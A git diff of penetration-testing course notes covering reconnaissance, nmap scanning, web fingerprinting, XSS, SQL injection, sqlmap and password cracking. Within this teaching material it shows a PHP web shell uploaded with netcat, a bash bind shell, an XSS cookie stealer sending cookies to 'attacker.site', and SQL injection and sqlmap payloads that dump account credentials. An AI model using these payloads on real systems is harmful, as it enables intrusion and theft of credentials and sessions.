@@ -8,37 +8,37 @@
 - Every information gathering stage will need the same focus and dedication as the first one.
 - Your penetration test will be **as strong as your weakest skill**!
 - First and one of the most crucial phases of an engagement.
-- A pentester cannot leave any stone unturned.
+- A penetration tester cannot leave any stone unturned.
 
 ### Open-Source Intelligence
 
-- Widening the attack surface
-- Mounting targeted attacks
-- Sharpening your tools in preparation for the next phases
+- Widening the attack surface.
+- Mounting targeted attacks.
+- Sharpening your tools in preparation for the next phases.
 
-Information Gathering from Social Networks
-- CrunchBase: find detailed information about founders, investors, employees, buyouts and acquisitions
+Information Gathering from Social Networks:
+- CrunchBase: find detailed information about founders, investors, employees, buyouts and acquisitions.
 
-Government Sites
-- System for Award Management
-- GSA eLibrary
+Government Sites:
+- System for Award Management.
+- GSA eLibrary.
 
-Whois database (also accessible through Linux command `whois`)
-- Owner name
-- Street addresses
-- Email Address
-- Technical Contacts
+Whois database (also accessible through Linux command `whois`):
+- Owner name.
+- Street addresses.
+- Email Address.
+- Technical Contacts.
 
-Browsing Client's sites
-- Check products
-- Services
-- Technologies
-- Company Culture
+Browsing Client's sites:
+- Check products.
+- Services.
+- Technologies.
+- Company Culture.
 
-Discovering Emai Pattern
-- `name.surname@company.com`
-- `surname.name@company.com`
-- Many email systems tend to inform the sender that mail was not delivered because it does not exit
+Discovering Emai Pattern:
+- `name.surname@company.com`.
+- `surname.name@company.com`.
+- Many email systems tend to inform the sender that mail was not delivered because it does not exit.
 
 ### Subdomain Enumeration
 
@@ -67,14 +67,10 @@ sublist3r -v -d google.com -b
 # -v : verbose
 # -d <domain>
 # -b bruteforce
-```
 
-- `amass`
-
-```bash
+# amass
 amass -ip -d google.com
 ```
-
 
 ## Footprinting & Scanning
 
@@ -91,12 +87,12 @@ Block: 200.200.0.0/16
 2^16 hosts = 200.200.0.0 - 200.200.255.255
 ```
 
-- `ping` command tests whether a machine is alive
-- Ping works by sending one or more special ICMP packets (**echo request** - Type 8)
-- If the destination host replies with **ICMP echo reply**
-- ICMP is part of the IP protocol
-- `fping` is an improved version of the `ping` utility
-- When running `fping` on a LAN you are directly attached to, even if you use the `-a` option, you will get some warning messages about the offline hosts (`ICMP Host Unreachable`). Those messages are easily removed by: `fping -a g 192.168.82.0 192.168.82.255 2>/dev/null`
+- `ping` command tests whether a machine is alive.
+- Ping works by sending one or more special ICMP packets (**echo request** - Type 8).
+- If the destination host replies with **ICMP echo reply**.
+- ICMP is part of the IP protocol.
+- `fping` is an improved version of the `ping` utility.
+- When running `fping` on a LAN you are directly attached to, even if you use the `-a` option, you will get some warning messages about the offline hosts (`ICMP Host Unreachable`). Those messages are easily removed by: `fping -a g 192.168.82.0 192.168.82.255 2>/dev/null`.
 
 ```bash
 fping -a -g IPRANGE
@@ -117,19 +113,19 @@ nmap -sn -iL hostilist.txt
 
 HOST DISCOVERY:
 
-- `-sL`: List Scan - simply list targets to scan
-- `-sn`: Ping Scan - disable port scan
-- `-Pn`: Treat all hosts as online -- skip host discovery
-- `-PS/PA/PU/PY[portlist]`: TCP SYN/ACK, UDP or SCTP discovery to given ports
-- `-PE/PP/PM`: ICMP echo, timestamp, and netmask request discovery probes
-- `-PO[protocol list]`: IP Protocol Ping
+- `-sL`: List Scan - simply list targets to scan.
+- `-sn`: Ping Scan - disable port scan.
+- `-Pn`: Treat all hosts as online -- skip host discovery.
+- `-PS/PA/PU/PY[portlist]`: TCP SYN/ACK, UDP or SCTP discovery to given ports.
+- `-PE/PP/PM`: ICMP echo, timestamp, and netmask request discovery probes.
+- `-PO[protocol list]`: IP Protocol Ping.
 
 ### OS Fingerprinting
 
-- Possible to identify OS because of some tiny differences in the network stack implementation of the various OS
-- Signature of the host behavior
-- The signature is compared against a database of known OS signatures
-- Offline OS fingerprinting can be done with `p0f` but we'll use `nmap`
+- Possible to identify OS because of some tiny differences in the network stack implementation of the various OS.
+- Signature of the host behavior.
+- The signature is compared against a database of known OS signatures.
+- Offline OS fingerprinting can be done with `p0f` but we'll use `nmap`.
 
 ```bash
 nmap -Pn -O <target(s)>
@@ -145,39 +141,39 @@ OS DETECTION:
 ### Port Scanning
 
 > Goals:
-> - Prepare for the vulnerability assessment phase
-> - Perform stealth reconnaissance
-> - Detect firewalls
+> - Prepare for the vulnerability assessment phase.
+> - Perform stealth reconnaissance.
+> - Detect firewalls.
 
-- Port Scanning goes after knowing the active targets on the network
-- Determine what TCP/UDP ports are opened
-- Also knowing what services are running, software and version, on an specific port
-- Port scanners automate probes requests and response analysis
-- Also let you detect if there's a firewall between you and your target
-- 3-way handshake: If port is closed -> RST + ACK
+- Port Scanning goes after knowing the active targets on the network.
+- Determine what TCP/UDP ports are opened.
+- Also knowing what services are running, software and version, on an specific port.
+- Port scanners automate probes requests and response analysis.
+- Also let you detect if there's a firewall between you and your target.
+- 3-way handshake: If port is closed -> RST + ACK.
 
 #### TCP Connect Scan
 
-- Simplest way to perform a port scan
-- If the scanner receives a `RST` packet, then the port is closed
-- If the scanner is able to complete the connection, then the port is open
-- TCP Connect Scans are recoded in the daemon logs (from the app point of view, the probe looks like a legitimate connection)
+- Simplest way to perform a port scan.
+- If the scanner receives a `RST` packet, then the port is closed.
+- If the scanner is able to complete the connection, then the port is open.
+- TCP Connect Scans are recoded in the daemon logs (from the app point of view, the probe looks like a legitimate connection).
 
 #### TCP SYN Scan
 
-- Default nmap scan
+- Default nmap scan.
 - Stealthy by design
-- Sends a SYN packet and analyzes the response coming from the target machine
-- If a RST packet is received, then port is closed
-- if a ACK packet is recevived, then the port is open (and RST packet is sent to the target to stop the handshake)
-- Cannot be detected by looking at daemons logs
+- Sends a SYN packet and analyzes the response coming from the target machine.
+- If a RST packet is received, then port is closed.
+- if a ACK packet is received, then the port is open (and RST packet is sent to the target to stop the handshake).
+- Cannot be detected by looking at daemons logs.
 
 #### Nmap Scan Types
 
-```
--sT performs a TCP connect scan
--sS performs a SYN scan
--sV performs a version detection scan
+```bash
+-sT # performs a TCP connect scan
+-sS # performs a SYN scan
+-sV # performs a version detection scan
 ```
 
 - `-sV` version detection scan mixes a TCP connect scan with some probes, which are used to detect what application is listening on a particular port, which isn't stealthy but useful.
@@ -188,37 +184,53 @@ OS DETECTION:
 
 ```bash
 nmap -sn 192.168.1.0/24 > hosts-up.txt
-nmap -sT -p80 192.168.1.0/24 # checks for all webservers in this network range
-nmap -sS -sV -p 21 192.168.1.0/24 # checks for service version
+nmap -sT -p80 192.168.1.0/24              # checks for all webservers in this network range
+nmap -sS -sV -p 21 192.168.1.0/24         # checks for service version
 ```
 
 #### Specifying targets
 
-- By DNS name: `nmap <scan_type> target1.domain.com target2.domain.com`
-- With an IP address list: `nmap <scan_type> 192.168.1.45 200.200.14.56 10.10.1.3`
-- CIDR notation: `nmap <scan_type> 192.168.1.0/24 200.200.1.0/16`
-- By using wildcards: `nmap <scan_type> 192.168.1.*` or `nmap <scan_type> 10.10.*.1` or `nmap <scan_type> 200.200.*.*`
-- Specifying ranges: `nmap <scan_types> 200.200.6-12.*`
-- Octets Lists: `nmap <scan_types> 10.14.33.1,3,17` or `nmap <scan_type> 10.14,20.3.1,3,17,233`
+```bash
+# By DNS name:
+nmap <scan_type> target1.domain.com target2.domain.com
 
-#### Choosing the ports to scan
+# With an IP address list
+nmap <scan_type> 192.168.1.45 200.200.14.56 10.10.1.3
 
-- `-p`: `nmap -p 21,22,139,445,443,80 <target>` or `nmap -p 100-1000 <target>`
+# CIDR notation
+nmap <scan_type> 192.168.1.0/24 200.200.1.0/16
+
+# By using wildcards
+nmap <scan_type> 192.168.1.*
+nmap <scan_type> 10.10.*.1
+nmap <scan_type> 200.200.*.*
+
+# Specifying ranges
+nmap <scan_types> 200.200.6-12.*
+
+# Octets Lists
+nmap <scan_types> 10.14.33.1,3,17
+nmap <scan_type> 10.14,20.3.1,3,17,233
+
+# Choosing the ports to scan `-p`:
+nmap -p 21,22,139,445,443,80 <target>
+nmap -p 100-1000 <target>
+```
 
 #### Discovering Network with Port Scanning
 
-- You might encounter networks that are protected by firewalls and where pings are blocked
-- It's not uncommon to come across a server that does not respond to pings but has many TCP/UDP ports open
-- `-Pn`: forces the scan on a server
-- if you would like to find an alive host, you can scan typical ports instead of performing a ping sweep
-- the four most basic TCP ports (22, 445, 80, 443) can be used as indicators of live hosts in the network
+- You might encounter networks that are protected by firewalls and where pings are blocked.
+- It's not uncommon to come across a server that does not respond to pings but has many TCP/UDP ports open.
+- `-Pn`: forces the scan on a server.
+- If you would like to find an alive host, you can scan typical ports instead of performing a ping sweep.
+- The four most basic TCP ports (22, 445, 80, 443) can be used as indicators of live hosts in the network.
 
 #### Spotting a Firewall
 
-- You might often see that a version was not recognized regardless of the open port
-- Or even the service type is not recognized
-- `tcpwrapped` means that the TCP handshake was completed but the remote host closed the connection without receiving any data
-- `--reason` nmap flag will show an explanation of twhy a port is marked as open or closed
+- You might often see that a version was not recognized regardless of the open port.
+- Or even the service type is not recognized.
+- `tcpwrapped` means that the TCP handshake was completed but the remote host closed the connection without receiving any data.
+- `--reason` nmap flag will show an explanation of why a port is marked as open or closed.
 
 ### `masscan`
 
@@ -302,49 +314,38 @@ These are the steps that a vulnerability scanner uses:
   - You can configure a scanner to ignore the operation system vulnerabilities and test only known web server vulnerabilities.
 - Probing: scanner sends probes to verify if the vulnerability exists, this phase is prone to false positives.
 
-## Web Attacks (16 items)
+## Web Attacks
+### Fingerprinting with `nc`, `openssl` & `httprint`
 
 Web applications use different technologies and programming paradigms compared to desktop apps:
 
-- Webapps often make up the vast majority of the internet-facing surface.
+- Web applications often make up the vast majority of the internet-facing surface.
 - It can be done manually and by using automatic tools.
 - Fingerprinting a web server means:
   - Web Server Service: IIS, Apache, nginx.
   - Version.
   - OS hosting the server.
 
-### Fingerprinting with Netcat
-
-- Manually send requests to the server
-- Banner grabbing:
-
 ```bash
-nc <target_address> 80
+# Manual Banner grabbing by sending requests to the server
+# Output will be different for a Debian Linux Box, Apache Server running on Red Hat, MS IIS running on a MS Windows.
+# `Netcat` does not perform any kind of encryption, so you cannot use it for HTTPS.
+
+> nc <target_address> 80    # You must write your request after running the command
+HEAD / HTTP/1.0             #  Write the request in uppercase always.
+
+# `openssl` is a CLI to manually use various features of the OpenSSL SSL/TLS toolkit
+# You can use it to establish a connection to an HTTPS service then send the usual HEAD HTTP verb:
+
+> openssl s_client -connect target.site:443
 HEAD / HTTP/1.0
-```
 
-Output will be different for a Debian Linux Box, Apache Server running on Red Hat, MS IIS running on a MS Windows.
-- Write the request in uppercase always
-- Netcat does not notify you after the connection to the server
-- You must write your request after running the command (or use `-v`)
-- Netcat does not perform any kind of encryption, so you cannot use it for HTTPS
+# Another example:
+printf 'GET / HTTP/1.1\r\nHost: github.com\r\n\r\n' | ncat --ssl github.com 443
 
-### Fingerprinting with OpenSSL
+# `httprint` is a web server fingerprinting tool that uses a signature-based technique to identify webservers
+> httpprint -P0 -h <target hosts> -s <signature file>
 
-- `openssl` is a CLI to manually use various features of the OpenSSL SSL/TLS toolkit
-- You can use it to establish a connection to an HTTPS service then send the usual HEAD HTTP verb:
-
-```bash
-open s_client -connect target.site:443
-HEAD / HTTP/1.0
-```
-
-### Fingerprinting with Httprint
-
-- `httprint` is a web server fingerprinting tool that uses a signature-based technique to identify webservers
-
-```bash
-httpprint -P0 -h <target hosts> -s <signature file>
 # -PO to avoid pinging the host
 # -h <target hosts> tells the tool to fingerprint a list of hosts, it is advised to use the IP address of the hosts you want to test
 # -s set the signature file to use
@@ -356,7 +357,7 @@ httpprint -P0 -h <target hosts> -s <signature file>
 - In REST APIs is common to use PUT for saving data, and not for saving files
 - If you confirm a PUT or DELETE during an engagement, you should confirm its exact impact twice
 
-```
+```bash
 # GET is used to request a resource
 GET /page.php HTTP/1.1
 Host: www.example.site
@@ -409,22 +410,10 @@ Content length: 20
 <?php phpinfo(); ?>
 ```
 
-#### PHP Shell
-
-```php
-if (isset($_GET['cmd'])) {
-  $cmd = $_GET['cmd'];
-  echo '<pre>';
-  $result = shell_exec($cmd);
-  echo $result;
-  echo '</pre>';
-}
-```
-
-Then you could do with `nc`:
-
 ```bash
-nc victim.site 80
+# PHP Shell
+
+> nc victim.site 80
 PUT /payload.php HTTP/1.0
 Content-type: text/html
 Content-length: 136
@@ -438,7 +427,7 @@ if (isset($_GET['cmd'])) {
 }
 ```
 
-### Netcat
+### `nc`
 
 ```bash
 # => server/listener
@@ -477,7 +466,7 @@ nc -lvp 5555 -e /bin/bash
 echo 'ls' | nc -v localhost 5555
 ```
 
-## Directories and Files Enumeration
+### Directories and Files Enumeration
 
 > Ability to:
 > - Find and utilize testing features
@@ -499,6 +488,7 @@ Tool:
   - Java application that can perform web resources enumeration
   - You can choose if you want to perform a pure brute-force or a dictionary-based brute-force
   - It's Linux alternative: `dirb`
+
 ### Dirb
 
 ```bash
@@ -516,110 +506,78 @@ dirb http://google.com -x extensions.txt -z 1000
 dirb http://google.com -x extensions.txt -o results.txt # output results to file
 ```
 
-#### <span style="color:red">LAB - (8/16) Dirbuster</span>
+### Dirbuster
 
+```bash
+# Find all machines in the network
+nmap -sn 10.104.11.0/24
 
+# Identify the machines role (.96 runs a webserver)
+nmap -sV 10.104.11.96,198
+```
 
+Find hidden files via dirbuster:
 
+![](imgs/dirbuster.png)
 
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
+You might find a `config.old` file where the MySQL database connection parameters are visible.
 
 ### Google Hacking
 
-> Goal #1: perform information gathering without contacting your targets, ability to find hidden resources
+Perform information gathering without contacting your targets, ability to find hidden resources: `site:`, `intitle:`, `inurl:`, `filetype:`, `AND`, `OR`, `&`, `|`, `-`
 
-- Usage of Google Dorks (ex `inurl:admin intitle:login`)
-
-`site:`, `intitle:`, `inurl:`, `filetype:`, `AND`, `OR`, `&`, `|`, `-`
-
-```
+```bash
 inurl:(htm|html|php|asp|jsp) intitle:"index of" "last modified" "parent directory" txt OR doc OR pdf
 ```
-
-- [Exploit DB](https://www.exploit-db.com/google-hacking-database)
-
 ### Cross Site Scripting
 
-> Ability to:
-> - Attack webapps' users
-> - Control webapps' content
-> - Gain advanced web attacks skills
+The attacker can target the web applications's users, and:
 
-- XSS is a vulnerability that lets an attacker control some of the content of a webapp
-- XSS vulnerabilities happen when a webapp uses unfiltered user input to build the output content displayed to its end users, letting an attacker control the output HTML and JS code, targeting the app's users (admin is included)
-- XSS involves injecting malicious code into the output of a webpage, this malicious code is the rendered (or executed) by the browser of the visiting users
-The attacker can target the webapp's users, and:
   - Modify the content of the site at run-time
   - Inject malicious contents
   - Steal the cookies, thus the session of a user
   - Perform actions on the web application as if it was a legitimate user
 
- User input is any parameter coming from the clientside of the webapp, as:
+ User input is any parameter coming from the client-side of the webapp, as:
+
   - Request headers
   - Cookies
   - Form inputs
   - POST parameters
-  - GET paramaters
+  - GET parameters
 
  Actors of a XSS attack:
- - Vulnerable website
-   - inputs should always be validated server side
-   - never ever trust user input
- - User/visitor (victim)
-   - Code executed/rendered by the browser of the visiting users
-   - XSS has low priority for developers, which shouldn't be
-   - it can be really hard for a victim to realiza that an attack is in progress
- - The pentester, launching attacks:
-   - Making their browsers load malicous content
-   - Performing operations on their behalf, like buying a product or changing a password
-   - Stealing the session cookies, thus being able to impersonate them on the vulnerable site
-   - If stolen user is an admin, the entire website can be impersonated
 
-- Reflection Point: When a search parameter is submitted thorugh a form and gets displayed on the output
-- After finding a reflection point, you have to underswtand if you can inject HTML code and see if it somehow gets to the output of the page
+| Vulnerable Website                            | User/Visitor (Victim)                                                                                                                | Penetration Tester                                                                       |
+| :-------------------------------------------- | :----------------------------------------------------------------------------------------------------------------------------------- | :--------------------------------------------------------------------------------------- |
+| Inputs should always be validated server side | Code executed/rendered by the browser of the visiting users                                                                          | Making their browsers load malicous content                                              |
+| Never ever trust user input                   | XSS vulnerabilities have low priority for developers, as it can be really hard for a victim to realize that an attack is in progress | Performing operations on their behalf, like buying a product or changing a password      |
+|                                               |                                                                                                                                      | Stealing the session cookies, thus being able to impersonate them on the vulnerable site |
+
+- Reflection Point: When a search parameter is submitted through a form and gets displayed on the output in an XSS attack
+- After finding a reflection point, you have to understand if you can inject HTML code and see if it somehow gets to the output of the page
 - Test XSS: `<script>alert('XSS')</script>`
 
-XSS Types:
-- Reflected
-  - When the malicious payload is carried inside the request that browser of the victim sends to the vulnerable website
-  - When users click on the link , the users trigger the attack
-  - `http://victim.site/search.php?find=<payload>`
-  - Called 'reflected' because an input field of the HTTP request sent by the browser gets immediately reflected to the output page
-  - Google Chrome has a reflected XSS filter built in to avoid this attack, but only trivial ones
-- Persistent
-  - Occur when the payload is sent to the vulnerable web server and then stored.
-  - When a web page of the vulnerable website pulls the stored malicious code and puts it within the HTML output, it will deliver the XSS payload
-  - The malicious code gets delivered each and every time a web browser hits the "injected" web page
-  - A single attack can exploit multiple web applications
-  - The most common vector for persistent attacks are HTML forms that submit conetnt to the web server and then display that content back to the users
-  - Element such as comments, user profiles, and forum posts are potential vector for XSS attacks
-- DOM Based
+### XSS Types
+
+**Reflected**
+
+- When the malicious payload is carried inside the request that browser of the victim sends to the vulnerable website
+- When users click on the link , the users trigger the attack
+- `http://victim.site/search.php?find=<payload>`
+- Called 'reflected' because an input field of the HTTP request sent by the browser gets immediately reflected to the output page
+- Google Chrome has a reflected XSS filter built in to avoid this attack, but only trivial ones
+
+**Persistent**
+
+- Occur when the payload is sent to the vulnerable web server and then stored.
+- When a web page of the vulnerable website pulls the stored malicious code and puts it within the HTML output, it will deliver the XSS payload
+- The malicious code gets delivered each and every time a web browser hits the "injected" web page
+- A single attack can exploit multiple web applications
+- The most common vector for persistent attacks are HTML forms that submit content to the web server and then display that content back to the users
+- Element such as comments, user profiles, and forum posts are potential vector for XSS attacks
+
+**DOM Based**
 
 Cookie Stealing via XSS
 - When `HttpOnly` flag is disabled, cookies can be stolen
@@ -629,7 +587,7 @@ Cookie Stealing via XSS
 ```javascript
 <script>
   var i = new Image();
-  i.src = "http://attacker.site/log.php?q="+document.cookie;
+  i.src = "http://attacker.site/log.php?q="+escape(document.cookie);
 </script>
 ```
 
@@ -643,63 +601,13 @@ flocse($fp);
 ?>
 ```
 
-- [OWASP-XSS](https://owasp.org/www-community/attacks/xss/)
+### SQL Injections
 
-#### <span style="color:red">VIDEO - (11/16) XSS</span>
-#### <span style="color:red">LAB (12/16) Cross site scripting</span>
-
-#### (13/16) SQL Injections - Study Guide
-
-- They allow an unathorized user to take control over SQL statements used by a web application.
-- This kind of attack has a huge impact on a web site because getting contorl over a backend database means controlling:
-  - User's credentials
-  - Data of the web application
-  - Credit Card numbers
-  - Shopping transactions
-
-##### SQL basics
-
-An application performs this tasks:
-- Connect to the DB
-- Submit the query to the database
-- Retrieve the results
-
-```sql
--- SELECT <columns list> FROM <table> WHERE <conditions>;
-SELECT name, description FROM products WHERE id=9;
-
--- UNION command performs a union between
-<SELECT statement> UNION <other SELECT statement>;
-```
-
-##### Vulnerable Dynamic Queries
-
-This dynamic query expects $id values as a string:
-
-```sql
-SELECT Name, Description FROM Products WHERE ID='$id'
-```
-
-But what if an attacker crafts a $id value which can change the query to something like: ` OR 'a'='a`
-
-Then the query becomes:
-```sql
-SELECT Name, Description FORM Products WHERE UD='' OR 'a'='a';
-```
-
-Which tells the database to select the items by checking two conditions wich is always true.
-
-An attacker could also exploit the UNION command by supplying the following:
-
-```sql
-' UNION SELECT Username, Password FROM Accounts WHERE 'a'='a
-```
-
-Thus it changes the original query to:
-
-```sql
-SELECT Name, Description FROM Products WHERE ID='' UNION SELECT Username, Password FROM Accounts WHERE 'a'='a';
-```
+They allow an unauthorized user to take control over SQL statements used by a web application. This kind of attack has a huge impact on a web site because getting control over a backend database means controlling:
+- User's credentials
+- Data of the web application
+- Credit Card numbers
+- Shopping transactions
 
 To find SQL injections, we need to check any user input (every input must be tested to conduct a professional pentest):
 - GET parameters
@@ -714,64 +622,82 @@ Tests can be:
 - SQL commands: `SELECT`, `UNION` and others
 - SQL comments: `#` or `--`
 
-##### Boolean Based SQLi
+### SQL basics
 
-Once penentration testers find a way to tell when a condition is true or false, they can ask the database some simple True/False questions:
+```sql
+-- SELECT <columns list> FROM <table> WHERE <conditions>;
+SELECT name, description FROM products WHERE id=9;
+
+-- UNION command performs a union between
+<SELECT statement> UNION <other SELECT statement>;
+```
+
+### => Vulnerable Dynamic Queries
+
+```sql
+-- This dynamic query expects $id values as a string:
+SELECT Name, Description FROM Products WHERE ID='$id'
+
+-- But what if an attacker crafts a $id value which can change the query to something like ` OR 'a'='a` then the query becomes:
+SELECT Name, Description FORM Products WHERE UD='' OR 'a'='a';
+-- ...which tells the database to select the items by checking two conditions which is always true.
+
+-- An attacker could also exploit the UNION command by supplying the following:
+-- ' UNION SELECT Username, Password FROM Accounts WHERE 'a'='a
+-- Thus it changes the original query to:
+
+SELECT Name, Description FROM Products WHERE ID='' UNION SELECT Username, Password FROM Accounts WHERE 'a'='a';
+```
+
+### => Boolean Based SQLi
+
+Once penetration testers find a way to tell when a condition is true or false, they can ask the database some simple True/False questions:
 - Is the first letter of the username 'a'?
 - Does this database contain three tables?
 - ...
 
-We can use two MySQL functions: `user()` and `substring()`
-- `user()` returns the name of the user currently using the database:
+We can use two MySQL functions: `user()` and `substring()`:
 
 ```sql
+-- `user()` returns the name of the user currently using the database:
 select user();
-```
 
-- `substring()` returns a substring of the given argument. It takes 3 parameters:
-  - the input string
-  - the position of the substring
-  - its length
+-- `substring()` returns a substring of the given argument. It takes 3 parameters:
+--  - the input string
+--  - the position of the substring
+--  - its length
 
-```sql
 select substring('elarnsecurity', 2, 1)
+
+-- We can use both together:
+substring(user(), 1, 1);        -- it might return 'r' for 'root' user
+
+substring(user(), 1, 1) = 'r'   -- if it returns 1 -> True; 0 -> False
+
+-- Combining those features, we can iterate over the letters of the username by using payloads as:
+-- ' or substr(user(), 1, 1) =='a
+-- ' or substr(user(), 1, 1) =='b
+-- when we find the first letter then we can move to the second and so on in order to guess the entire username.
 ```
 
-We can use both together:
-```sql
-substring(user(), 1, 1);
---- it might return 'r' for 'root' user
+### => UNION Based SQL Injections
 
-substring(user(), 1, 1) = 'r'
--- if it returns 1 -> True; 0 -> False
-```
-
-Combining those features, we can iterate over the letters of the username by using payloads as:
+Many times some of the results of a query are directly displayed on the output page. This behavior can be exploited using the UNION SQL command.
 
 ```sql
-' or substr(user(), 1, 1) =='a
-' or substr(user(), 1, 1) =='b
-```
+-- The following payload forces the web application to display the result of the `user()` function on the output page.
 
-when we find the first letter then we can move to the second and so on in order to guess the entire username.
-
-##### UNION Based SQL Injections
-
-- Many times some of the results of a query are directly displayed on the output page
-- This feature can be exploited using the UNION SQL command
-- If the payload makes the result of the original query empty, then we can have the results of another, attacker controlled, query shown on the page
-- The following payload fornces the web application to display the result of the `user()` function on the output page
-- The comment at the end of the line prevents the follwing part of the original query from being parsed by the database, comments the rest from the original query
-- The comment also contains a third dash because most of the browsers automaticall remove trailing spaces in the URL so, if you need to inject a comment via a GET request, you have to add a character after the trailing space of the comment
-
-```sql
 SELECT description FROM items where id='' UNION SELECT user(); -- -';
+
+-- The comment at the end of the line prevents the following part of the original query from being parsed by the database, comments the rest from the original query.
+-- The comment also contains a third dash because most of the browsers automatically remove trailing spaces in the URL so.
+-- If you need to inject a comment via a GET request, you have to add a character after the trailing space of the comment*.
+-- Also used if we don't want our web application to add anything in the url after our injection.
 ```
 
-- To exploit a SQL injection you first need to know how many fields the vulnerable query selects, you do this by trial and error
-- We know there's an injection by `' UNION sELECT null; -- -`, this should display:
+To exploit a SQL injection you first need to know how many fields the vulnerable query selects, you do this by trial and error. We know there's an injection by `' UNION SELECT null; -- -`, this should display:
 
-```
+```bash
 Warning: mysql_fetch_array() expects parameter 1 to be mysql_result, boolean given in /var/www/view.php on line 32
 ```
 
@@ -781,7 +707,7 @@ Warning: mysql_fetch_array() expects parameter 1 to be mysql_result, boolean giv
 - Now we can exploit the injection: `' UNION SELECT user(), 'elsid2'; -- -`
 - Not only `SELECT` queries are vulnerable
 
-##### SQLMap
+### SQLMap
 
 - Can detect and exploit SQL injections
 - Needs to know the vulnerable URL and the parameter to test for a SQLi
@@ -789,16 +715,48 @@ Warning: mysql_fetch_array() expects parameter 1 to be mysql_result, boolean giv
 ```bash
 sqlmap -u <URL> -p <inejction parameter> [options]
 sqlmap -u 'http://victim.site/view.php?id=1141' -p id --technique=U
-# technique=U --> UNION based SQL injection technique
-sqlmap -u <url> --data=<POST string> -p id [options]
-# You can copy the POST string from a request intercepted in Burp Suite
+sqlmap -u <url> --data=<POST string> -p id [options] # POST string as user=a&pass=a
+
+# You can copy the POST string  from a request intercepted in Burp Suite
+sqlmap -r file.req -p user
+sqlmap -u 'http://192.168.1.20/dvwa/vulnerabilities/sqli/?id=231&Submit=Submit#' --cookie="PHPSESSID=26faf41ffba440ce1346b8d8ca9408ac; security=low" -D dvwa -T users --dump
+
+# --technique=U --> UNION based SQL injection technique
+# --banner shows server's banner
+# --flush-session
+
+sqlmap -u http://10.124.211.96/newsdetails.php?id=1 -D awd -T accounts --dump
 ```
 
-#### <span style="color:red">VIDEO - (14/16) SQL Injection</span>
-#### <span style="color:red">VIDEO - (15/16) Sqlmap</span>
-#### <span style="color:red">(16/16) SQL Injection</span>
-
 ### System Attacks (6 items)
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
 
 #### (1/6) Malware - Study Guide
 
@@ -841,7 +799,7 @@ Any software used to misuse computer sistems with the intent to cause a DoS, spy
     - Long passwords made by upper and lower case letters, numbers and symbols can take days or even years to crack
     - **John The Ripper**: can mount both brute force and dictionary-based attacks against a password database (see: `john --list=formats`)
       - Fast because of the high use of parallelization, crack strategies
-      - `/etc/passwd`: contains info about user acccounts
+      - `/etc/passwd`: contains info about user accounts
       - `/etc/shadow`: contains info about the actual password hashes
       - `john` needs the username and the password hashes to be in the same file, therefore we need to use the `unshadow` utility that comes with _John The Ripper_
       - `john -incremental -users:<users list> <file to crack>`
@@ -880,7 +838,7 @@ A buffer is an area in the RAM reserved for temporary data storage:
 - Parts of a video file
 - Server banners received by a client application
 - etc.
-- Buffers have a finite size, therefore: if an app develooper does not enforce a buffer limit, an attacker could find a way to write data beyond those limits and write there arbitrary code
+- Buffers have a finite size, therefore: if an app developer does not enforce a buffer limit, an attacker could find a way to write data beyond those limits and write there arbitrary code
 
 ##### Stack
 
@@ -945,7 +903,7 @@ hydra -L users.txt -P pass.txt http-get://localhost/
 > Ability to:
 > - Enumerate network resources
 > - Attack Windows sessions
-> - Obtain unathorized access to Windows resources
+> - Obtain unauthorized access to Windows resources
 
 Windows' filesharing can be exploited.
 - NetBIOS (Network Basic Input Output System)
